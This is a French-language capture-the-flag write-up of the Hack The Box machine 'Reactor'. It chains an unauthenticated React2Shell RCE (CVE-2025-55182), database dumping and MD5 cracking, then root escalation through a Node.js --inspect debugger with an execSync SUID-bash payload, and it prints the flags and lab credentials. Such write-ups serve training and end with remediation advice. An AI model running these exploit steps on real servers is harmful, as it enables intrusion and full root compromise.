
## Informations Générales

  

| Champ | Valeur |

|---|---|

| **Plateforme** | Hack The Box |

| **Machine** | Reactor |

| **Difficulté** | Easy |

| **OS** | Linux (Ubuntu 24.04) |

| **IP cible** | `10.129.38.97` |

| **Ports ouverts** | 22 (SSH), 3000 (HTTP — Next.js) |

| **CVE exploitée** | CVE-2025-55182 (React2Shell) |

| **User flag** | `18c2d508132764fdd2e22eb660805690` |

| **Root flag** | `c7977c1b9640e49284e42609ecd111b8` |

  

## Chaîne d'attaque résumée

  

```

Next.js 15.0.3 vulnérable (CVE-2025-55182)

    → RCE unauthentifiée en tant que "node"

    → Dump de reactor.db (SQLite)

    → Hash MD5 de "engineer" extrait

    → Craqué avec hashcat + rockyou → "reactor1"

    → SSH en tant qu'engineer → user flag

    → Node.js --inspect sur localhost:9229 (root)

    → SSH port forwarding + Chrome DevTools Protocol

    → Exécution de code en tant que root → root flag

```

  

---

  

## Phase 1 — Reconnaissance

  

### Nmap

  

Scan classique des ports TCP :

  

```bash

nmap -sC -sV 10.129.38.97

```

  

Résultat :

- **Port 22** — OpenSSH 9.6p1 (Ubuntu)

- **Port 3000** — HTTP, Next.js (ReactorWatch — Core Monitoring System)

  

### Exploration Web — Port 3000

  

En accédant à `http://10.129.38.97:3000/`, on trouve un dashboard de monitoring de réacteur nucléaire appelé **ReactorWatch**. Le site est entièrement statique (SSG/SSR), aucun formulaire de login, aucun lien vers d'autres pages.

  

Le dashboard affiche :

- Des métriques (température, pression, flux de neutrons, débit de refroidissement)

- Des logs système

- Un **panel "On-Site Personnel"** avec 3 noms :

  - **Dr. Elena Rodriguez** — Lead Nuclear Engineer (ONLINE)

  - **Marcus Kim** — Senior Technician (ONLINE)

  - **James Thompson** — Safety Officer (OFFLINE)

  

### Tentatives infructueuses (rabbit holes)

  

Avant de trouver la bonne approche, plusieurs pistes ont été explorées sans succès. C'est important de les documenter pour éviter de perdre du temps à l'avenir :

  

**Directory/route brute-forcing :** ffuf avec `raft-large-words.txt` et des wordlists custom thématiques (reactor, nuclear, dashboard, admin...) → tout retourne 404. L'app n'a qu'une seule route : `/`.

  

**Analyse des chunks JavaScript :** extraction du Build ID (`L3bimJe_3LvBcFWAnK5L4`) depuis le payload RSC, téléchargement et analyse de tous les chunks JS visibles (`webpack`, `main-app`, `polyfills`, chunks `517` et `4bd1b696`). Grep agressif sur des mots-clés (password, token, api, ssh...) → que du code framework React/Next.js, aucun code applicatif avec des credentials.

  

**CVE-2025-29927 (middleware bypass):** test du header `x-middleware-subrequest` avec toutes les variantes connues sur des dizaines de routes → aucun effet. L'app n'utilise pas de middleware auth.

  

**Brute-force SSH :** hydra avec des listes basées sur les noms du staff (elena, marcus, james, etc.) et des mots de passe thématiques (reactor, nuclear, site7...) → 0 résultat sur 380+ combinaisons.

  

**Fichiers exposés :** `.env`, `.env.local`, `robots.txt`, `sitemap.xml`, source maps (`.js.map`), `package.json` → tout retourne 404 via HTTP.

  

**Routes API Next.js :** `/api/staff`, `/api/users`, `/api/auth`, etc. → tout 404.

  

**Leçon critique :** le directory brute-forcing et la chasse aux routes cachées dans les bundles JS ne mènent nulle part sur cette machine. **L'entrée n'est pas une route cachée, c'est une vulnérabilité au niveau du framework lui-même.** L'identification de la version exacte du framework est la clé.

  

### Identification de la version — le tournant

  

Avec **Wappalyzer** ou en inspectant les headers HTTP (`X-Powered-By: Next.js`), on identifie : **Next.js 15.0.3** avec **React 19.0.0-rc**.

  

Une recherche rapide révèle que cette version est vulnérable à **CVE-2025-55182**, alias **React2Shell**.

  

---

  

## Phase 2 — Exploitation initiale (Foothold)

  

### CVE-2025-55182 — React2Shell

  

**Qu'est-ce que c'est ?**

  

CVE-2025-55182 est une vulnérabilité de type **Remote Code Execution (RCE) unauthentifiée** dans le protocole RSC (React Server Components) Flight, utilisé par Next.js pour sérialiser/désérialiser les données entre serveur et client.

  

**Comment ça marche ?**

  

1. React utilise un protocole appelé "Flight" pour envoyer l'arbre de composants du serveur au client

2. Le désérialiseur côté serveur est vulnérable à une **pollution de prototype** (Prototype Pollution)

3. Un attaquant envoie une requête POST `multipart/form-data` contenant une structure JSON circulaire

4. La chaîne `$1:constructor:constructor` force le serveur à résoudre le constructeur JavaScript `Function`

5. Ce constructeur est invoqué avec du code arbitraire contrôlé par l'attaquant → **RCE**

  

**Versions affectées :** React 19.0.0 — 19.2.0 / Next.js 14.3.0-canary.77 — 15.0.4

  

**Impact :** CVSS 10.0 — aucune authentification requise, aucune misconfiguration nécessaire, une app Next.js par défaut est exploitable.

  

### Mise en place de l'exploit

  

```bash

# Ajouter le hostname dans /etc/hosts

echo "10.129.38.97 reactor.htb" >> /etc/hosts

  

# Cloner le PoC public

git clone https://github.com/p3ta00/react2shell-poc

cd react2shell-poc

  

# Créer un environnement Python isolé et installer les dépendances

python3 -m venv venv

source venv/bin/activate

pip install requests

```

  

### Test de l'exploit

  

```bash

python3 react2shell-poc.py -t http://reactor.htb:3000 -c "id"

```

  

Résultat : `uid=999(node) gid=988(node) groups=988(node)` → on a un shell en tant que l'utilisateur **node** (le process Next.js).

  

### Comprendre le shell obtenu — Shell stateless

  

Le shell obtenu via React2Shell est **stateless** : chaque commande est une requête HTTP indépendante. Cela signifie :

  

- `cd /tmp` suivi de `ls` ne listera PAS `/tmp` — le `cd` meurt avec la requête

- Il faut toujours utiliser des **chemins absolus** : `ls /opt/reactor-app/`

- Pour simuler un `cd` : `cd /opt/reactor-app && ls`

- Chaîner les commandes avec `&&` ou `;`

- Certaines commandes sans output (comme `cp`) retournent une réponse vide `''` — c'est normal

  

Le mode interactif du PoC (`--interactive`) facilite l'envoi de commandes successives mais chacune reste indépendante.

  

---

  

## Phase 3 — Énumération post-exploitation (en tant que node)

  

### Exploration du système de fichiers

  

```bash

react2shell> pwd

# → /opt/reactor-app

  

react2shell> ls

# → app  next.config.js  node_modules  package.json  package-lock.json  reactor.db

  

react2shell> ls /opt

# → reactor-app  uptime-monitor

  

react2shell> ls /home

# → engineer

  

react2shell> find . -name ".env*" 2>/dev/null

# → ./.env

  

react2shell> find . -name "*.db" 2>/dev/null

# → ./reactor.db

```

  

**Éléments intéressants trouvés :**

- `reactor.db` — base de données SQLite dans le répertoire de l'app

- `.env` — fichier de configuration avec potentiellement des secrets

- `/opt/uptime-monitor` — un second service (important pour la privesc)

- `/home/engineer` — un utilisateur humain (inaccessible en tant que node)

  

### Dump de la base de données SQLite

  

```bash

react2shell> sqlite3 /opt/reactor-app/reactor.db .dump

```

  

Résultat :

  

```sql

CREATE TABLE users (

    id INTEGER PRIMARY KEY,

    username TEXT NOT NULL,

    password_hash TEXT NOT NULL,

    role TEXT NOT NULL,

    email TEXT

);

INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');

INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');

  

CREATE TABLE sensor_logs (

    id INTEGER PRIMARY KEY,

    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,

    sensor_id TEXT,

    reading REAL,

    status TEXT

);

-- Données de capteurs (température, pression, débit...)

```

  

**Deux comptes extraits :**

  

| Username | Hash MD5 | Role | Email |

|---|---|---|---|

| admin | `a203b22191d744a4e70ada5c101b17b8` | administrator | admin@reactor.htb |

| engineer | `39d97110eafe2a9a68639812cd271e8e` | operator | engineer@reactor.htb |

  

Les hashes sont du **MD5 non salé** (32 caractères hexadécimaux) — extrêmement faible, craquable en secondes.

  

---

  

## Phase 4 — Craquage du hash et accès SSH

  

### Hashcat — MD5 (mode 0)

  

```bash

echo "39d97110eafe2a9a68639812cd271e8e" > /tmp/hash.txt

hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt

```

  

Résultat en moins d'une seconde :

  

```

39d97110eafe2a9a68639812cd271e8e:reactor1

```

  

**Credentials :** `engineer:reactor1`

  

> **Alternative :** CrackStation.net donne le même résultat instantanément pour des MD5 présents dans les bases de données publiques.

  

### Connexion SSH

  

```bash

ssh engineer@10.129.38.97

# Password: reactor1

```

  

### User flag

  

```bash

cat ~/user.txt

# 18c2d508132764fdd2e22eb660805690

```

  

---

  

## Phase 5 — Escalade de privilèges (root)

  

### Découverte du vecteur — Node.js `--inspect`

  

En énumérant les processus depuis le shell engineer :

  

```bash

ps aux | grep node

```

  

On trouve un processus **exécuté en tant que root** :

  

```

root  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

```

  

**Pourquoi c'est vulnérable ?**

  

Le flag `--inspect` active le **protocole de débogage Node.js** (Chrome DevTools Protocol — CDP) sur le port 9229. Ce protocole permet :

- D'évaluer du JavaScript arbitraire dans le processus cible

- De contrôler l'exécution du programme

  

Comme le processus tourne en **root**, tout JS exécuté via le debugger s'exécute avec les **privilèges root**.

  

Le port est bindé sur `127.0.0.1` (localhost uniquement) — on ne peut pas l'atteindre directement depuis Kali. Mais on a un accès SSH, donc on peut faire du **port forwarding**.

  

### Vérifier que le port est ouvert

  

```bash

# Depuis la session SSH engineer

curl -s http://127.0.0.1:9229/json

```

  

Résultat : les métadonnées du debugger, y compris l'URL WebSocket.

  

### Attacher le debugger

  

Pas besoin de tunnel SSH séparé dans ce cas — on est déjà connecté en SSH sur la machine, donc on peut atteindre localhost:9229 directement :

  

```bash

# Depuis la session SSH engineer

node inspect 127.0.0.1:9229

```

  

On obtient le prompt `debug>`.

  

### Exécuter du code en tant que root

  

Dans le prompt du debugger :

  

```javascript

exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash').toString()")

```

  

**Ce que fait cette commande :**

1. `process.mainModule.require('child_process')` — charge le module Node.js pour exécuter des commandes système

2. `execSync('cp /bin/bash /tmp/rootbash')` — copie le binaire bash

3. `chmod 4755 /tmp/rootbash` — met le **bit SUID** sur la copie

  

Le bit SUID signifie que quand n'importe quel utilisateur lance `/tmp/rootbash`, il s'exécute avec les privilèges du propriétaire du fichier — ici **root**, puisqu'on l'a copié depuis un processus root.

  

**Le retour `''` est normal** — `cp` et `chmod` ne produisent pas d'output.

  

### Quitter le debugger et obtenir le shell root

  

```bash

# Quitter le debugger

debug> .exit

  

# Lancer le bash SUID

/tmp/rootbash -p

  

# Vérifier

id

# uid=1000(engineer) gid=1000(engineer) euid=0(root)

```

  

Le flag `-p` est **crucial** : il dit à bash de conserver l'`euid` (effective user ID) hérité du bit SUID. Sans `-p`, bash drop automatiquement les privilèges pour des raisons de sécurité.

  

### Root flag

  

```bash

cat /root/root.txt

# c7977c1b9640e49284e42609ecd111b8

```

  

---

  

## Concepts clés appris

  

### 1. CVE-2025-55182 (React2Shell)

RCE unauthentifiée dans le désérialiseur RSC Flight de React/Next.js. La pollution de prototype via une structure JSON circulaire permet d'invoquer le constructeur `Function` avec du code arbitraire. Pas besoin de route cachée ni de misconfiguration — une app Next.js 15.0.3 par défaut est vulnérable.

  

### 2. Shell stateless vs shell interactif

Un shell obtenu via une vuln web (RCE par requête HTTP) est stateless : chaque commande est indépendante, le contexte (`cd`, variables d'environnement) ne persiste pas. Il faut utiliser des chemins absolus et chaîner les commandes.

  

### 3. MD5 non salé = pas de sécurité

Un hash MD5 sans sel se craque en moins d'une seconde avec rockyou. En production, il faut utiliser bcrypt, argon2 ou scrypt avec un sel unique par utilisateur.

  

### 4. Node.js `--inspect` en production = shell root

Le protocole de débogage Node.js permet d'exécuter du JavaScript arbitraire dans le processus. Si le processus est root, c'est un shell root. Le binding sur `127.0.0.1` ne protège pas si l'attaquant a un accès local (SSH, SSRF, ou tout foothold).

  

### 5. SUID bit pour la persistence

Copier bash et mettre le bit SUID (`chmod 4755`) permet d'obtenir un shell root depuis n'importe quel utilisateur local. Le flag `-p` est obligatoire pour que bash conserve les privilèges élevés.

  

### 6. L'importance d'identifier la version du framework

Sur cette machine, le directory brute-forcing ne mène nulle part. L'identification de la version exacte (Next.js 15.0.3) via les headers HTTP ou Wappalyzer est ce qui pointe directement vers la CVE. Toujours vérifier les CVE connues pour la stack identifiée avant de brute-forcer.

  

---

  

## Outils utilisés

  

| Outil | Usage |

|---|---|

| **nmap** | Scan de ports et identification de services |

| **curl** | Requêtes HTTP manuelles, extraction des payloads RSC |

| **ffuf** | Directory/route brute-forcing (infructueux ici) |

| **Wappalyzer** | Identification de la version Next.js |

| **react2shell-poc** | Exploit CVE-2025-55182 (PoC Python) |

| **hashcat** | Craquage MD5 avec rockyou (`-m 0`) |

| **ssh** | Accès distant + port forwarding |

| **node inspect** | Attachement au debugger Node.js |

  

---

  

## Recommandations de remédiation

  

1. **Mettre à jour Next.js** vers 15.0.5+ et React vers 19.2.1+ pour corriger CVE-2025-55182

2. **Remplacer MD5** par bcrypt/argon2 avec sel unique par utilisateur

3. **Supprimer `--inspect`** de tout processus en production

4. **Principe de moindre privilège** : le service uptime-monitor n'a pas besoin de tourner en root

5. **Segmenter le réseau** : la base SQLite ne devrait pas être accessible depuis le process web